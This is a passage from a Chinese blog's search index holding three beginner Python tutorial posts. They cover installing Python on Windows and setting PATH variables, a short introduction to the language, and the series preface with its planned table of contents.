<h4 id="2"><a href="#2" class="headerlink" title="2"></a>2</h4><p><img src="/images/8447b565/python_install_1.png" alt="step2"></p>
<h4 id="3"><a href="#3" class="headerlink" title="3"></a>3</h4><p>安装成功，点击<code>Close</code><br><img src="/images/8447b565/python_install_2.png" alt="step3"></p>
<p><a name="step4"></a></p>
<h4 id="4"><a href="#4" class="headerlink" title="4"></a>4</h4><p>按下组合键<kbd>win</kbd> + <kbd>R</kbd>，<kbd>win</kbd>键就是键盘上有windows徽标的那个键，输入<code>cmd</code>，按下确定，即可打开<strong>命令提示符</strong>，（也可以用鼠标点击<code>开始</code>-&gt;<code>所有程序</code>-&gt;<code>附件</code>-&gt;<code>命令提示符</code>）<br><img src="/images/8447b565/python_install_3.png" alt="step4"></p>
<h4 id="5"><a href="#5" class="headerlink" title="5"></a>5</h4><p>在<strong>命令提示符</strong>窗口中输入<code>python</code>，显示如下界面即证明安装成功<br><img src="/images/8447b565/python_install_4.png" alt="step5"></p>
<h4 id="6"><a href="#6" class="headerlink" title="6"></a>6</h4><p>若没有上述界面出现，那么可能是安装的时候忘记添加环境变量，即忘记勾选了<code>Add Python 3.7 to PATH</code>，此时需要手动配置环境变量，按如下操作添加环境变量，点击<code>开始</code>-&gt;右键<code>计算机</code>-&gt;选择<code>属性</code><br><img src="/images/8447b565/python_install_5.png" alt="step6"></p>
<h4 id="7"><a href="#7" class="headerlink" title="7"></a>7</h4><p>点击<code>高级系统设置</code><br><img src="/images/8447b565/python_install_6.png" alt="step7"></p>
<h4 id="8"><a href="#8" class="headerlink" title="8"></a>8</h4><p>点击选项卡<code>高级</code>，再点击<code>环境变量</code><br><img src="/images/8447b565/python_install_7.png" alt="step8"></p>
<h4 id="9"><a href="#9" class="headerlink" title="9"></a>9</h4><p>新建一个<strong>用户变量</strong>（若是<strong>系统变量</strong>则每个用户都可以使用，前提是安装第一步时勾选了<code>install launcher for all users</code>，<strong>用户变量</strong>则只是当前用户可使用）点击<code>新建</code>。<br><img src="/images/8447b565/python_install_8.png" alt="step9"></p>
<h4 id="10"><a href="#10" class="headerlink" title="10"></a>10</h4><p><strong>变量名</strong>为<code>PYTHON</code>（可以填其他名字），<strong>变量值</strong>为python的<strong>安装路径</strong>，若是默认安装一般为<code>C:\User\你的用户名\AppData\Local\Programs\Python\Python37-32\</code>，若是自定义安装则填写安装时自己填下的路径，点击<code>确定</code><br><img src="/images/8447b565/python_install_9.png" alt="step10"></p>
<h4 id="11"><a href="#11" class="headerlink" title="11"></a>11</h4><p>以同样的方式再新建一个变量，名为<code>PYTHON_SCRIPT</code>（可以填其他名字）,值为python安装路径下的<code>Scripts</code>目录，默认为<code>C:\User\你的用户名\AppData\Local\Programs\Python\Python37-32\Scripts\</code>。<br><img src="/images/8447b565/python_install_10.png" alt="step11"></p>
<h4 id="12"><a href="#12" class="headerlink" title="12"></a>12</h4><p>再新建一个变量，名为<code>PATH</code>，<strong>注意</strong>，这个名字是<strong>固定的</strong>，不可以随便填。值为<code>%PYTHON%;%PYTHON_SCRIPT%;</code>，<code>%变量名%</code>的意思是<strong>变量的值</strong>，所以读者也可以直接在<code>PATH</code>变量里填写<code>C:\User\你的用户名\AppData\Local\Programs\Python\Python37-32\; C:\User\你的用户名\AppData\Local\Programs\Python\Python37-32\Scripts\;</code>。<strong>注意</strong>，若是选择将变量添加到<strong>系统变量</strong>，<strong>系统变量</strong>那一栏原来就有<code>PATH</code>变量，不用新建，直接把值添加到里面即可，注意用分号<code>;</code>隔开每个值。<br><img src="/images/8447b565/python_install_11.png" alt="step12"></p>
<h4 id="13"><a href="#13" class="headerlink" title="13"></a>13</h4><p>然后在<strong>命令提示符</strong>中输入<code>python</code>验证，具体看<a href="#step4">第4步</a></p>
<h3 id="敬请期待"><a href="#敬请期待" class="headerlink" title="敬请期待"></a>敬请期待</h3><p>环境搭建到此完成，下面将进入python的基础教程。</p>
]]></content>
      <categories>
        <category>python教程</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>python教程（一）·简介</title>
    <url>/c2dae310/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>先简单介绍下python。（真的很简单）<span id="more"></span></p>
<h3 id="python是什么"><a href="#python是什么" class="headerlink" title="python是什么?"></a>python是什么?</h3><p>Python是<strong>Guido van Rossum</strong>发布于<strong>1991年</strong>的一种计算机程序设计语言。是一种<strong>动态</strong>的、<strong>面向对象</strong>的<strong>脚本语言</strong>，是一种<strong>解释型</strong>的，<strong>弱类型</strong>的<strong>高级计算机语言</strong>。稍作了解即可。</p>
<p><strong>注意</strong>：python有2.x和3.x两个<strong>不兼容</strong>的版本，这是个历史遗留问题，<strong>python3.x</strong>将是趋势，所以在本教程里选择<strong>python3.x</strong></p>
<h3 id="python怎么工作"><a href="#python怎么工作" class="headerlink" title="python怎么工作"></a>python怎么工作</h3><p>python是<strong>解释型</strong>语言，需要一个叫<strong>解释器</strong>的程序，来根据程序的<strong>源码</strong>（自己写下的代码），执行相应的操作，这是一个很简单的说法，能理解即可。</p>
<h3 id="python可以做什么？"><a href="#python可以做什么？" class="headerlink" title="python可以做什么？"></a>python可以做什么？</h3><ul>
<li>游戏开发  <strong>星战前夜（EVE）</strong> 的服务器是python开发的</li>
<li>桌面软件</li>
<li>web开发（许多大型网站都有用到python，如<strong>YouTube</strong>，<strong>豆瓣</strong>，<strong>知乎</strong>）</li>
<li>运维管理</li>
<li>…</li>
</ul>
<h3 id="python的优缺点"><a href="#python的优缺点" class="headerlink" title="python的优缺点"></a>python的优缺点</h3><p>优点：</p>
<ul>
<li>跨平台，同一份源码可不加修改（大部分情况下是这样）的运行在任意的平台上，即在<strong>Windows</strong>上写的python程序可以放到<strong>Linux</strong>，<strong>MacOS</strong>等平台上运行</li>
<li>学习成本低（语法简单易懂，易于入门）</li>
<li>有非常完善的基础代码库（通俗来将就是现成的功能）</li>
<li>有大量的第三方库（就是别人写好的功能）</li>
</ul>
<p>缺点：</p>
<ul>
<li>速度慢，这是硬伤，其实只要不是在性能苛刻的领域里，对大部分的需求都是可以应对的，毕竟大部分应用不需要那么快的运行速度</li>
<li>代码不能加密，不同于<strong>编译型语言</strong>，python是<strong>解释型语言</strong>，不需要编译（不严格地讲），发布程序相当于发布源代码。这一点其实这在自由开放的互联网时代不是那么重要，不想让别人知道你的源代码的，同时使用你的python程序，也是有一定的加密方法的（似乎有点打自己脸），读者可自行查阅。</li>
<li>除了以上两个比较突出的缺点，其余的小缺点就忽略了吧。。。</li>
</ul>
<hr>
<p>关于python简单了解即可，不需要太过深入。当然，有兴趣的读者可自行<a href="https://baike.baidu.com/item/Python/407313?fr=aladdin">百度</a></p>
]]></content>
      <categories>
        <category>python教程</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>教程</tag>
      </tags>
  </entry>
  <entry>
    <title>python教程（零）·前言</title>
    <url>/e0d15d61/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="/assets/js/Meting.min.js"></script><p>本教程是作者根据自己学习python的经验写下的，<span id="more"></span>一来是想将经验分享给对python同样感兴趣的小白（大神请忽略），二来是想借此加深本人对python的理解，温故而知新。</p>
<h3 id="学习基础"><a href="#学习基础" class="headerlink" title="学习基础"></a>学习基础</h3><p>本教程面向的读者，最好是有一定计算机基础的，或者学过其它计算机语言。如果没有基础也没多大关系，遇到不懂的，可以利用搜索引擎来学习，搜索引擎真是个好东西。</p>
<p>如果有必要的话，也就是搜索引擎都无法解决的时候，可以发邮件向作者提问，作者一定给予令你满意的答复（当然，在我会的前提下<code>^_^</code>）。</p>
<h3 id="教程概览"><a href="#教程概览" class="headerlink" title="教程概览"></a>教程概览</h3><p>本教程初步分为一下部分：</p>
<ul>
<li>零 前言</li>
<li>一 学前准备<ol>
<li>简介</li>
<li>环境搭建</li>
<li>命令行基本操作</li>
</ol>
</li>
<li>二 基础知识<ol>
<li>第一个程序</li>
<li>数据类型</li>
<li>变量</li>
<li>条件语句</li>
<li>数据结构初探</li>
<li>循环语句</li>
</ol>
</li>
<li>三 函数<ol>
<li>函数与模块</li>
<li>自定义函数</li>
<li>函数进阶（上）</li>
<li>函数进阶（下）</li>
</ol>
</li>
<li>python小项目之微信远程控制</li>
<li>四 序列</li>
<li>五 列表与元组</li>
<li>六 字符串</li>
<li>七 字典</li>
<li>八 文件操作</li>
<li>python小项目之文本编辑器</li>
</ul>
<p><strong>完</strong>…</p>
<ul>
<li>九 面向对象</li>
<li>十 网络编程</li>
<li>十一 并发编程</li>
<li>十二 图形界面</li>
<li>…</li>
</ul>
<p>教程大致按上面进行，并且在一些阶段之间将插入一些小实践。</p>
<p><strong>随着教程的进展，上表可能会进行更改或者细分</strong></p>
<hr>
<p>鉴于本人也是学习计算机技术不久（而且语文很差），但是我会不遗余力地来完善这篇教程，如有写得不好，欢迎指正！</p>
<hr>
<p>//由于本人高三在读，周末只有7个小时的假期，所以教程的更新进度会比较慢（基本上一周一篇），见谅，不要打我<code>！o((⊙﹏⊙))o.</code></p>
<p>现高三毕业，即将迎来大学。</p>
<p>本系列教程就到《文件操作》就结束了，一来是面向对象的知识比较难，本人认为自己还没完全掌握好，难以讲好（网络上还是有很多优秀的文章讲解着方面的知识的，读者不必担心）；二来自己没有精力和心情再坚持下去了。</p>
]]></content>
      <categories>
        <category>python教程</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>教程</tag>
      </tags>
  </entry>
</search>
